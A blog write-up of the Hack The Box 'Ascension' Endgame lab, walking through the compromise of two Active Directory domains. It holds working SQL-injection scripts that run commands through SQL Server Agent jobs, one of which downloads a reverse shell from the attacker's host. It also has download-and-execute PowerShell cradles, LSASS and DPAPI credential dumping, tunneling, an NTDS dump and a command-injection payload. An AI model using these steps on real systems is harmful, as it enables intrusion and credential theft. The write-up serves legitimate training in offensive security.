---
layout: post
title: "HTB{ Ascension }"
date: 2024-04-30 01:00:00 +0300
author: snovvcrash
tags: [write-up, hackthebox, endgame, active-directory, blind-sqli, sqlmap, mssql, mssql-agent-job, mssql-proxy, inveigh, seatbelt, sharpdpapi, dsrm, portscan-ps1, pivoting, double-hop, thycotic, secret-server, disable-firewall, aspx-webshell, regeorg, neo-regeorg, openssh-windows, slack, rubeus, asktgt, rbcd, powerview4]
---

This write-up is all about pwning the Ascension Endgame from Hack The Box (written in August 2021).

<!--cut-->

> HTB Endgame Walkthoughs:
> 
> * [HTB{ Hades }](/2020/12/28/htb-hades.html)
> * [HTB{ RPG }](/2021/08/07/htb-rpg.html)
> * **➤**{:.green} [HTB{ Ascension }](/2024/04/30/htb-ascension.html)
> 
> [hackthebox-writeups](https://github.com/Hackplayers/hackthebox-writeups/tree/master/endgames)

<p align="right">
  <a href="https://app.hackthebox.com/endgames/ascension"><img src="https://img.shields.io/badge/%e2%98%90-Hack%20The%20Box-8ac53e?style=flat-square" alt="htb-badge.svg" /></a>
</p>

![banner.png](/assets/images/htb/endgames/ascension/banner.png)
{:.center-image}

![info.png](/assets/images/htb/endgames/ascension/info.png)
{:.center-image}

* TOC
{:toc}

|        Hostname        |       IP       |
| :--------------------: | :------------: |
|  WEB01.daedalus.local  | 192.168.10.39  |
|   DC1.daedalus.local   |  192.168.10.6  |
| MS01.megaairline.local | 192.168.11.210 |
| DC2.megaairline.local  | 192.168.11.201 |

Entry point: WEB01.daedalus.local (IP `10.13.38.20`).

# 1. Takeoff

Scan the environment:

```
$ sudo nmap -n -Pn --min-rate=1000 -T4 10.13.38.20 -p- -v | tee ports
$ ports=`cat ports | grep '^[0-9]' | awk -F "/" '{print $1}' | tr "\n" ',' | sed 's/,$//'`
$ sudo nmap -n -Pn -sVC -oA nmap/10.13.38.20-alltcp.nmap 10.13.38.20 -p$ports

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Daedalus Airlines
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.2027.00; RTM+
| ms-sql-ntlm-info:
|   Target_Name: DAEDALUS
|   NetBIOS_Domain_Name: DAEDALUS
|   NetBIOS_Computer_Name: WEB01
|   DNS_Domain_Name: daedalus.local
|   DNS_Computer_Name: WEB01.daedalus.local
|   DNS_Tree_Name: daedalus.local
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2020-12-30T06:50:12
|_Not valid after:  2050-12-30T06:50:12
|_ssl-date: 2020-12-31T23:19:40+00:00; +1h20m59s from scanner time.
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: DAEDALUS
|   NetBIOS_Domain_Name: DAEDALUS
|   NetBIOS_Computer_Name: WEB01
|   DNS_Domain_Name: daedalus.local
|   DNS_Computer_Name: WEB01.daedalus.local
|   DNS_Tree_Name: daedalus.local
|   Product_Version: 10.0.17763
|_  System_Time: 2020-12-31T23:19:30+00:00
| ssl-cert: Subject: commonName=WEB01.daedalus.local
| Not valid before: 2020-10-09T18:14:30
|_Not valid after:  2021-04-10T18:14:30
|_ssl-date: 2020-12-31T23:19:40+00:00; +1h20m59s from scanner time.
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
64662/tcp open  msrpc         Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h29m33s, deviation: 3h01m26s, median: 1h20m58s
| ms-sql-info:
|   10.13.38.20:1433:
|     Version:
|       name: Microsoft SQL Server 2017 RTM+
|       number: 14.00.2027.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: true
|_    TCP port: 1433
| smb-os-discovery:
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: WEB01
|   NetBIOS computer name: WEB01\x00
|   Domain name: daedalus.local
|   Forest name: daedalus.local
|   FQDN: WEB01.daedalus.local
|_  System time: 2020-12-31T15:19:33-08:00
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-12-31T23:19:32
|_  start_date: N/A
```

Discover SQLi in `http://10.13.38.20/book-trip.php`.

![web-sqli.png](/assets/images/htb/endgames/ascension/web-sqli.png)
{:.center-image}

Save the request to `book-trip.req` and enumerate DBs with sqlmap:

```
$ sqlmap -r book-trip.req -p destination --dbms mssql --batch --dbs --proxy http://127.0.0.1:8080 --fresh-queries
```

![sqlmap-dbs.png](/assets/images/htb/endgames/ascension/sqlmap-dbs.png)
{:.center-image}

List all the database users:

```
$ sqlmap -r book-trip.req -p destination --dbms mssql --batch --users
```

![sqlmap-users.png](/assets/images/htb/endgames/ascension/sqlmap-users.png)
{:.center-image}

Drop into the SQL shell and get the MS SQL Server version, current database name and current user name:

```
$ sqlmap -r book-trip.req -p destination --dbms mssql --batch --sql-shell http://127.0.0.1:8080 --fresh-queries
sql-shell> @@version
sql-shell> db_name()
sql-shell> current_user
```

![sqlmap-sql-shell.png](/assets/images/htb/endgames/ascension/sqlmap-sql-shell.png)
{:.center-image}

## Enum DB Roles

Here we're looking at what roles database users are assigned.

Create `roles` table for the output (sqlmap sometimes doesn't do it correctly when feeding it complex queries directly for [blind SQLis](https://reconshell.com/not-so-blind-rce-with-sql-injection/)):

```
CREATE TABLE roles ([username] sysname, [rolename] sysname)

destination='; CREATE TABLE roles ([rolename] sysname, [username] sysname)-- xyz&adults=&children=
```

Map database user names to database role names (query stolen from [docs.microsoft.com](https://docs.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-database-role-members-transact-sql?view=sql-server-ver15#example)):

```
SELECT isnull (DP1.name, 'No members') AS DatabaseUserName, DP2.name AS DatabaseRoleName
  FROM msdb.sys.database_role_members AS DRM
  LEFT OUTER JOIN msdb.sys.database_principals AS DP1
    ON DRM.member_principal_id = DP1.principal_id
  RIGHT OUTER JOIN msdb.sys.database_principals AS DP2
    ON DRM.role_principal_id = DP2.principal_id
WHERE DP2.type = 'R'
ORDER BY DP1.name

destination='; INSERT INTO roles (username, rolename) SELECT isnull (DP1.name, 'No members') AS DatabaseUserName, DP2.name AS DatabaseRoleName FROM msdb.sys.database_role_members AS DRM LEFT OUTER JOIN msdb.sys.database_principals AS DP1 ON DRM.member_principal_id = DP1.principal_id RIGHT OUTER JOIN msdb.sys.database_principals AS DP2 ON DRM.role_principal_id = DP2.principal_id WHERE DP2.type = 'R' ORDER BY DP1.name-- xyz&adults=&children=
```

Dump the resulting table:

```
$ sqlmap -r book-trip.req -p destination --dbms mssql --batch -D daedalus -T roles --dump --proxy http://127.0.0.1:8080 --fresh-queries
```

![sqlmap-dump-roles-1.png](/assets/images/htb/endgames/ascension/sqlmap-dump-roles-1.png)
{:.center-image}

![sqlmap-dump-roles-2.png](/assets/images/htb/endgames/ascension/sqlmap-dump-roles-2.png)
{:.center-image}

The `daedalus_admin` user has `SQLAgentUserRole`, `SQLAgentReaderRole` and `SQLAgentOperatorRole` roles assigned, which [means](https://docs.microsoft.com/en-us/sql/ssms/agent/sql-server-agent-fixed-database-roles?view=sql-server-ver15) he can create and run SQL Server Agent jobs even if he is not a sysadmin.

If we could impersonate `daedalus_admin`, then we would be able to create and run jobs too.

## Enum DB Grants

Now we're looking for principals that current database user (`daedalus`) is allowed to impersonate.

Create `grants` table for the output:

```
CREATE TABLE grants (username varchar(1024))

destination='; CREATE TABLE grants (username varchar(1024))-- xyz&adults=&children=
```

Discover principals that can be impersonated by `daedalus` (query stolen from [NetSPI](https://blog.netspi.com/hacking-sql-server-stored-procedures-part-2-user-impersonation/#find)):

```
SELECT distinct b.name
  FROM sys.server_permissions a
  INNER JOIN sys.server_principals b
    ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'

destination='; INSERT INTO grants (username) SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'-- xyz&adults=&children=
```

Dump the resulting table:

```
$ sqlmap -r book-trip.req -p destination --dbms mssql --batch -D daedalus -T grants --dump --proxy http://127.0.0.1:8080 --fresh-queries
```

![sqlmap-dump-grants.png](/assets/images/htb/endgames/ascension/sqlmap-dump-grants.png)
{:.center-image}

Voila! As one would expect, we can impersonate `daedalus_admin` using [EXECUTE AS](https://docs.microsoft.com/en-us/sql/t-sql/statements/execute-as-transact-sql?view=sql-server-ver15).

## Enum Proxy Accounts

> "A SQL Server Agent proxy account defines a security context in which a job step can run. Each proxy corresponds to a security credential. To set permissions for a particular job step, create a proxy that has the required permissions for a SQL Server Agent subsystem, and then assign that proxy to the job step." – [docs.microsoft.com](https://docs.microsoft.com/en-us/sql/ssms/agent/create-a-sql-server-agent-proxy?view=sql-server-ver15)

Create `proxy` table for the output (result sets taken from [here](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-help-proxy-transact-sql?view=sql-server-ver15#result-sets)):

```
CREATE TABLE proxy ([proxy_id] int, [name] sysname, [credential_identity] sysname, [enabled] tinyint, [description] nvarchar(1024), [user_sid] varbinary(85), [credential_id] int, [credential_identity_exists] int)

destination='; CREATE TABLE proxy ([proxy_id] int, [name] sysname, [credential_identity] sysname, [enabled] tinyint, [description] nvarchar(1024), [user_sid] varbinary(85), [credential_id] int, [credential_identity_exists] int)-- xyz&adults=&children=
```

Impersonate `daedalus_admin` and enumerate SQL Server Agent proxies:

```
EXEC AS login = N'daedalus_admin'; INSERT INTO proxy EXEC msdb.dbo.sp_help_proxy

destination='; EXEC AS login = N'daedalus_admin'; INSERT INTO proxy EXEC msdb.dbo.sp_help_proxy-- xyz&adults=&children=
```

Dump the resulting table:

```
$ sqlmap -r book-trip.req -p destination --dbms mssql --batch -D daedalus -T proxy --dump --proxy http://127.0.0.1:8080 --fresh-queries
```

![sqlmap-dump-proxy.png](/assets/images/htb/endgames/ascension/sqlmap-dump-proxy.png)
{:.center-image}

We've discovered an existent proxy, so we can now execute the full attack to gain RCE.

## MSSQL Agent Jobs for Command Execution

I will follow **Optiv** [research](https://www.optiv.com/explore-optiv-insights/blog/mssql-agent-jobs-command-execution) to gain RCE via Agent jobs. The only thing that I have to add is the `@proxy_id` parameter (for the `sp_add_jobstep` procedure) which will point to the discovered proxy account.

PoC script on Python to get ping back:

```python
#!/usr/bin/env python3

import sys
from random import choices
from string import ascii_lowercase

import requests

lhost = sys.argv[1]

rnd = ''.join(choices(ascii_lowercase, k=8))

sqli_rce = """\
USE msdb;\
EXEC AS login = N'daedalus_admin';\
EXEC msdb.dbo.sp_add_job @job_name = N'%s_job';\
EXEC msdb.dbo.sp_add_jobstep @job_name = N'%s_job', @step_name = N'%s_step', @subsystem = N'CmdExec', @command = N'c:\\windows\\system32\\cmd.exe /c ping -n 1 %s', @retry_attempts=1, @retry_interval=5, @proxy_id=1;\
EXEC msdb.dbo.sp_add_jobserver @job_name = N'%s_job';\
EXEC msdb.dbo.sp_start_job @job_name = N'%s_job';\
""" % (rnd, rnd, rnd, lhost, rnd, rnd)

sqli_template = "'; %s-- xyz"

data = {'destination': sqli_template % sqli_rce, 'adults': '', 'children': ''}
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
resp = requests.post('http://10.13.38.20/book-trip.php', data=data, proxies=proxies)
```

![exec-agent-job-poc.png](/assets/images/htb/endgames/ascension/exec-agent-job-poc.png)
{:.center-image}

Weaponized script to deliver [this](https://github.com/xct/xc) reverse shell by [@xct](https://twitter.com/xct_de) and execute it:

```python
#!/usr/bin/env python3

from sys import argv
from random import choices
from string import ascii_lowercase

import requests


class AgentJobShell:

	def __init__(self, subsystem, lhost, lport):
		self._subsystem = subsystem
		self._lhost = lhost
		self._lport = lport

		# Upload shell
		if self._subsystem == 'PowerShell':
			self._command = '''powershell -NoP -sta -NonI -W Hidden -Exec Bypass -C "(New-Object Net.WebClient).DownloadFile(''http://%s:%s/xc.exe'', ''$env:userprofile\\music\\snovvcrash.exe'')"''' % (self._lhost, self._lport)

		# Exec shell
		elif self._subsystem == 'CmdExec':
			self._command = '''c:\\windows\\system32\\cmd.exe /c %%USERPROFILE%%\\music\\snovvcrash.exe %s %s''' % (self._lhost, self._lport)

	def exec_agent_job(self):
		rnd = ''.join(choices(ascii_lowercase, k=8))

		sqli_rce = """\
		USE msdb;\
		EXEC AS login = N'daedalus_admin';\
		EXEC msdb.dbo.sp_add_job @job_name = N'%s_job';\
		EXEC msdb.dbo.sp_add_jobstep @job_name = N'%s_job', @step_name = N'%s_step', @subsystem = N'%s', @command = N'%s', @retry_attempts=1, @retry_interval=5, @proxy_id=1;\
		EXEC msdb.dbo.sp_add_jobserver @job_name = N'%s_job';\
		EXEC msdb.dbo.sp_start_job @job_name = N'%s_job';\
		""".replace('\t', '') % (rnd, rnd, rnd, self._subsystem, self._command, rnd, rnd)

		sqli_template = "'; %s-- xyz"

		data = {'destination': sqli_template % sqli_rce, 'adults': '', 'children': ''}
		proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
		resp = requests.post('http://10.13.38.20/book-trip.php', data=data, proxies=proxies)


if __name__ == '__main__':
	subsystem = argv[1]
	lhost = argv[2]
	lport = argv[3]

	s = AgentJobShell(subsystem, lhost, lport)
	s.exec_agent_job()
```

![exec-agent-job-weaponized.png](/assets/images/htb/endgames/ascension/exec-agent-job-weaponized.png)
{:.center-image}

Now we can grab the first flag and move on.

![flag-1.png](/assets/images/htb/endgames/ascension/flag-1.png)
{:.center-image}

## !Flag

```
1 - ASCENSION{y0ur_******************}
```

## !Refs

* [Beyond xp_cmdshell: Owning the Empire through SQL Server](https://www.slideshare.net/nullbind/beyond-xpcmdshell-owning-the-empire-through-sql-server)
* [Hacking SQL Server on Scale with PowerShell](https://secure360.org/wp-content/uploads/2017/05/SQL-Server-Hacking-on-Scale-UsingPowerShell_S.Sutherland.pdf)
* [04. Command Execution - Security Knowledge Base](https://sofianehamlaoui.github.io/Security-Cheatsheets/databases/sqlserver/3-command-execution/#agent-jobs-cmdexec-powershell-activex-etc)
* [FAQ and examples about the SQL Server Agent](https://www.sqlshack.com/faq-and-examples-about-the-sql-server-agent/)
* [Simple example for creating and scheduling SQL Server Agent jobs](https://renenyffenegger.ch/notes/development/databases/SQL-Server/architecture/services/agent/job/examples/simple)
* [Running a SSIS Package from SQL Server Agent Using a Proxy Account](https://www.mssqltips.com/sqlservertip/2163/running-a-ssis-package-from-sql-server-agent-using-a-proxy-account/)

# 2. Intercept

After getting the initial shell on WEB01, I will run [Inveigh](https://github.com/Kevin-Robertson/Inveigh) to see what name resolution requests are flying around in the network:

```
PS > IEX(New-Object Net.WebClient).DownloadString("http://10.14.14.37/inveigh.ps1")
PS > Invoke-Inveigh -IP 192.168.10.39 -ConsoleOutput N -FileOutput Y -NBNS Y –mDNS Y –Proxy Y -MachineAccounts Y -HTTP N
```

![web01-inveigh.png](/assets/images/htb/endgames/ascension/web01-inveigh.png)
{:.center-image}

Someone on the local box is repeatedly trying to resolve non-existent `FIN01` name. It gives me an idea that a scheduled task may possibly be involved to simulate this activity. I will attempt to run [Seatbelt](https://github.com/GhostPack/Seatbelt) to list scheduled tasks, but it fails due to insufficient privileges. That's why I decide to get a meterpreter shell, migrate to another process and try again.

![web01-meterpreter-migrate.png](/assets/images/htb/endgames/ascension/web01-meterpreter-migrate.png)
{:.center-image}

I will use [Invoke-Seatbelt.ps1](https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Seatbelt.ps1) to launch Seatbelt from memory (Defender is active), and this time I am lucky to get some domain creds:

```
PS > IEX(New-Object Net.WebClient).DownloadString("http://10.14.14.4/inveigh.ps1")
PS > Invoke-Seatbelt -Command ScheduledTasks
```

![web01-seatbelt-scheduledtasks.png](/assets/images/htb/endgames/ascension/web01-seatbelt-scheduledtasks.png)
{:.center-image}

:thought_balloon: ***OFF TOP***. *This method of bypassing AV signature analysis is really cool, btw. You can Gzip-compress and Base64-encode a .NET assembly to load it reflectively via PowerShell right from memory! [This](https://www.praetorian.com/blog/running-a-net-assembly-in-memory-with-meterpreter) blog post covers the topic in depth, while I can use this simple script to prepare an executable to be injected into PowerShell code:*

```powershell
function Invoke-CompressEncodeAssembly
{
	$bytes = [System.IO.File]::ReadAllBytes("\path\to\binary.exe")
	[System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream
	$gzipStream = New-Object System.IO.Compression.GzipStream($output, [System.IO.Compression.CompressionMode]::Compress)
	$gzipStream.Write($bytes, 0, $bytes.Length)
	$gzipStream.Close()
	$output.Close()
	[byte[]] $byteOutArray = $output.ToArray()
	$encodedZipped = [System.Convert]::ToBase64String($byteOutArray)
	$encodedZipped
}
```

User `DAEDALUS\billing_user` is a local admin on WEB01, so I can set SOCKS tunnel with [Chisel](https://github.com/jpillora/chisel), WinRM into the box and capture the second flag:

```
$ ./chisel server --reverse -p 8000
meterpreter > execute -cH -f "cmd /c c:\users\svc_dev\music\chisel.exe client 10.14.14.4:8000 R:socks"
$ proxychains4 -q cme smb 192.168.10.39 -u 'billing_user' -p 'D43d4lusB1ll1ngB055'
$ proxychains4 -q evil-winrm -u billing_user -p D43d4lusB1ll1ngB055 -i 192.168.10.39 -s `pwd` -e `pwd`
```

![flag-2.png](/assets/images/htb/endgames/ascension/flag-2.png)
{:.center-image}

## !Flag

```
2 - ASCENSION{N0_c0mm@nd_*******}
```

## !Bonus

When running Seatbelt with `-group=all`, I noticed another set of privileged credentials for MSSQL. It was extracted as a result of the `CredEnum` module execution:

```
PS > Invoke-Seatbelt -Command CredEnum
```

![web01-seatbelt-credenum.png](/assets/images/htb/endgames/ascension/web01-seatbelt-credenum.png)
{:.center-image}

Now I can configure reverse port forwarding on `eth2` interface (that's my [Virtualbox host-only Ethernet adapter](https://www.virtualbox.org/manual/ch06.html#network_hostonly)) and log into MSSQL using SQL Server Management Studio on my Windows host:

```
meterpreter > execute -cH -f "cmd /c c:\users\svc_dev\music\chisel.exe client 10.14.14.4:8000 R:192.168.56.110:1433:127.0.0.1:1433"
```

![web01-mssql-sa-1.png](/assets/images/htb/endgames/ascension/web01-mssql-sa-1.png)
{:.center-image}

![web01-mssql-sa-2.png](/assets/images/htb/endgames/ascension/web01-mssql-sa-2.png)
{:.center-image}

![web01-mssql-sa-3.png](/assets/images/htb/endgames/ascension/web01-mssql-sa-3.png)
{:.center-image}

I also tried to get a shell as `NT SERVICE\mssqlserver` and then escalate to admin by abusing `SeImpersonatePrivilege` with [RoguePotato](https://github.com/antonioCoco/RoguePotato), but this attempt failed.

# 3-4. Contrails, Wingman

After obtaining admin privileges on WEB01, I will collect LSASS secrets and get `DAEDALUS\svc_backup` user creds right off the bat from Credential Manager Mimikatz collector (`credman` section):

```
meterpreter > kiwi_cmd '"sekurlsa::logonPasswords full" "exit"'
```

![web01-logonpasswords.png](/assets/images/htb/endgames/ascension/web01-logonpasswords.png)
{:.center-image}

![bh-svc_backup.png](/assets/images/htb/endgames/ascension/bh-svc_backup.png)
{:.center-image}

As we will see later, that's not the intended way to get these credentials.

I will use [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) to discover deeplier hidden Data Protection secrets. I start from a meterpreter shell as `DAEDALUS\billing_user` within a Medium Mandatory Level process (UAC is enabled). It lets me pwn `DAEDALUS\svc_backup` in the intended way:

```
Cmd > .\SharpDPAPI.exe credentials /password:D43d4lusB1ll1ngB055
```

![web01-dpapi-credentials.png](/assets/images/htb/endgames/ascension/web01-dpapi-credentials.png)
{:.center-image}

Then I will switch over to a High Mandatory Level meterpreter shell (still as `DAEDALUS\billing_user`) and enumerate master keys supplying a dummy password. Note, that only `Administrator.DAEDALUS` (domain admin) and `billing_user` master keys are successfully triaged:

```
Cmd > .\SharpDPAPI.exe masterkeys /password:Passw0rd!
```

![web01-dpapi-masterkeys.png](/assets/images/htb/endgames/ascension/web01-dpapi-masterkeys.png)
{:.center-image}

Now I will attempt to decrypt all users' DPAPI credentials with DPAPI_SYSTEM secret:

```
Cmd > .\SharpDPAPI.exe machinecredentials
```

![web01-dpapi-machinecredentials.png](/assets/images/htb/endgames/ascension/web01-dpapi-machinecredentials.png)
{:.center-image}

As you can see, some additional creds are extracted, including the password of the builtin DAEDALUS domain admin. I don't know if it was intended by Endgame creators (doubt it), but at this point I can log into DC1 and grab both the third and the fourth flags:

```
$ proxychains4 -q cme smb 192.168.10.6 -u 'administrator' -p 'pleasefastenyourseatbelts01!'
$ proxychains4 -q evil-winrm -u 'administrator' -p 'pleasefastenyourseatbelts01!' -i 192.168.10.6 -s `pwd` -e `pwd`
```

![flag-3-4.png](/assets/images/htb/endgames/ascension/flag-3-4.png)
{:.center-image}

## 4. Wingman. The Intended Way

After obtaining `DAEDALUS\svc_backup` credentials and examining his domain rights (`CanPSRemote` to DC1) I am supposed to WinRM into the box and search for some juicy stuff. The `Invoke-Binary` cmdlet from evil-winrm did not work for me for some reason, so I had to upload `winPEAS.exe` manually and run it from disk:

```
$ proxychains4 -q evil-winrm -i 192.168.10.6 -u 'svc_backup' -p 'jkQXAnHKj#7w#XS$' -s `pwd` -e `pwd`
*Evil-WinRM* PS C:\Users\svc_backup.DAEDALUS\music> upload winpeas.exe
*Evil-WinRM* PS C:\Users\svc_backup.DAEDALUS\music> .\winpeas.exe log
*Evil-WinRM* PS C:\Users\svc_backup.DAEDALUS\music> download out.txt
```

![dc1-winpeas-1.png](/assets/images/htb/endgames/ascension/dc1-winpeas-1.png)
{:.center-image}

DC1 appears to have some extra drives mounted, one of which is labeled as "Backups". If I switch to this drive, I will see local admin [DSRM](https://book.hacktricks.xyz/windows/active-directory-methodology/dsrm-credentials) password.

![dc1-winpeas-2.png](/assets/images/htb/endgames/ascension/dc1-winpeas-2.png)
{:.center-image}

So now I can dump NTDS with impacket's secretsdump.py – daedalus.local is pwned:

```
$ proxychains4 -q cme smb 192.168.10.6 -u administrator -p 'kF4df76fj*JfAcf73j' --local-auth
$ proxychains4 -q secretsdump.py DC1/administrator:'kF4df76fj*JfAcf73j'@192.168.10.6 -just-dc
```

![dc1-secretsdump.png](/assets/images/htb/endgames/ascension/dc1-secretsdump.png)
{:.center-image}

## !Flags

```
3 - ASCENSION{15nT_dPaP1_*******}  <== DPAPI is mentioned, so messing with LSASS memory was not the intended way
4 - ASCENSION{0G_*************}
```

## !Bonus

When running kiwi's `lsa_dump_secrets` I noticed that `WEB01\svc_dev` password appeared in context of the SQLSERVERAGENT service.

![web01-lsa_dump_secrets.png](/assets/images/htb/endgames/ascension/web01-lsa_dump_secrets.png)
{:.center-image}

It makes sense because here kiwi is showing us those proxy account credentials that are saved in MSSQL Server. If I run SharpDPAPI with this password, I can decrypt `svc_dev` DPAPI credential blob and obtain `sa` secret once again:

```
Cmd > .\SharpDPAPI.exe credentials /password:a2W@rWAHzG+zQrB4
```

![web01-dpapi-sa-v2.png](/assets/images/htb/endgames/ascension/web01-dpapi-sa-v2.png)
{:.center-image}

# 5. Corridor

Possessing domain admin's password in plaintext, I will make my life easier and connect to DC1 via RDP for further enumeration:

```
$ proxychains4 -q xfreerdp /u:'administrator' /p:'pleasefastenyourseatbelts01!' /v:192.168.10.6 /dynamic-resolution +clipboard /drive:share,/home/snovvcrash/htb/endgames/ascension/www
```

![dc1-rdp.png](/assets/images/htb/endgames/ascension/dc1-rdp.png)
{:.center-image}

If the Endgame description is to be believed, there is another domain somewhere to be attacked, so the first thing I will do is enumerate the network.

![dc1-network-enum.png](/assets/images/htb/endgames/ascension/dc1-network-enum.png)
{:.center-image}

DC1 is a dual-homed machine with `192.168.11.6` as the second IP address. There are also two yet unknown machines in ARP cache: `192.168.11.201` and `192.168.11.210`. I can navigate to my local SMB drive and import [PowerView](https://github.com/ZeroDayLab/PowerSploit/blob/master/Recon/PowerView.ps1) to enumerate domain trusts:

```
Cmd > powershell -exec bypass
PS > cd "\\tsclient\share"
PS > . .\powerview4.ps1
PS > Invoke-MapDomainTrust
```

![dc1-map-domain-trust.png](/assets/images/htb/endgames/ascension/dc1-map-domain-trust.png)
{:.center-image}

The second domain – *megaairline.local* – is in `FOREST_TRANSITIVE` trust with *daedalus.local* (cross-forest trust between the root of two domain forests, [ref](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)). According to the machine names on Hack The Box board I will assume that `192.168.11.201` and `192.168.11.210` are DC2.megaairline.local and MS01.megaairline.local (not necessarily in that order). It can be verified with nslookup.

![dc1-nslookup.png](/assets/images/htb/endgames/ascension/dc1-nslookup.png)
{:.center-image}

I will use [Portscan.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/Invoke-Portscan.ps1) to enumerate open ports on these machines:

```
PS > . .\invoke-portscan.ps1
PS > Invoke-Portscan -Hosts 192.168.11.201,192.168.11.210 -TopPorts 1000 -T 4 -oA dc2-ms01-1000
PS > cat dc2-ms01-1000.gnmap | findstr Open
```

![dc1-portscan.png](/assets/images/htb/endgames/ascension/dc1-portscan.png)
{:.center-image}

I will target the web service at 80/TCP, 443/TCP on MS01 and search for low hanging fruits (80/TCP is open actually, it just errors out). To enumerate HTTP(S) applications I will use [gobuster](https://github.com/OJ/gobuster/releases/latest) and discover some interesting endpoints:

```
PS > .\gobuster.exe dir -ku 'https://ms01.megaairline.local' -w directory-list-lowercase-2.3-big.txt -x aspx -a 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0' -s 200,204,301,302,307,401 -b 400,404
```

![dc1-gobuster.png](/assets/images/htb/endgames/ascension/dc1-gobuster.png)
{:.center-image}

There's a [Thycotic Secret Server](https://thycotic.com/products/secret-server/) running on MS01 and it waits for authentication.

![ms01-secret-server-login.png](/assets/images/htb/endgames/ascension/ms01-secret-server-login.png)
{:.center-image}

I will assume that some user from daedalus.local also belongs to megaairline.local, so I will grab the last NT hash from NTDS that we yet don't have a plaintext value for (DAEDALUS\elliot) and go to [crackstation.net](https://crackstation.net/).

![elliot-crackstation-net.png](/assets/images/htb/endgames/ascension/elliot-crackstation-net.png)
{:.center-image}

Nice, now I can verify it with a simple `net use` command against megaairline.local:

```
PS > net use \\dc2.megaairline.local\NETLOGON '84@m!n@9' /user:megaairline.local\elliot
PS > net use \\dc2.megaairline.local\NETLOGON /delete
```

![dc1-net-use-netlogon.png](/assets/images/htb/endgames/ascension/dc1-net-use-netlogon.png)
{:.center-image}

The elliot user creds are valid in megaairline.local, cool! By the way, I could also verify the NT hash directly without the plaintext value – with [SharpMapExec](https://github.com/cube0x0/SharpMapExec), for example:

```
PS > Invoke-SharpMapExec -Command "ntlm smb /user:elliot /ntlm:74fdf381a94e1e446aaedf1757419dcd /domain:megaairline.local /computername:dc2 /m:shares"
```

![dc1-sharpmapexec.png](/assets/images/htb/endgames/ascension/dc1-sharpmapexec.png)
{:.center-image}

So now I will log into Secret Server and go straight to `/SecretServer/AdminScripts.aspx`.

![ms01-secret-server-ssh-1.png](/assets/images/htb/endgames/ascension/ms01-secret-server-ssh-1.png)
{:.center-image}

Honestly, I spent quite some time enumerating the web application and searching for known public CVEs – there aren't that many of them. And I was very surprised that there is a command injection in the *Params* field when you **edit** (SSH) scripts.

![ms01-secret-server-ssh-2.png](/assets/images/htb/endgames/ascension/ms01-secret-server-ssh-2.png)
{:.center-image}

![ms01-secret-server-ssh-3.png](/assets/images/htb/endgames/ascension/ms01-secret-server-ssh-3.png)
{:.center-image}

Not sure why it is still not assigned a CVE ID... May be it's up coming :thinking: Anyways, if I provide something like `foo || type c:\users\elliot\desktop\flag.txt || bar` as a payload, I will get the fifth flag.

![flag-5.png](/assets/images/htb/endgames/ascension/flag-5.png)
{:.center-image}

Now let's get a proper shell on the box.

## !Flag

```
ASCENSION{n0t_so_s3cR3t_*******}
```

# 6. Upgrade

Before actually messing with getting the reverse shell I will first disable Windows Firewall via GPO (both the domain and standard profiles).

![dc1-disable-firewall.png](/assets/images/htb/endgames/ascension/dc1-disable-firewall.png)
{:.center-image}

DC1 machine, being a Windows Server with a Active Directory Domain Service role, keeps reactivating the firewall, so creating a new GPO is am important step in obtaining a stable shell (a pretty guide on how to disable the Windows Firewall in any way you want 🠚 [here](https://adamtheautomator.com/disable-windows-firewall/)).

Now, there're 2 possible users to get the shell as: `MEGAAIRLINE\elliot` and `IIS APPPOOL\defaultapppool`.

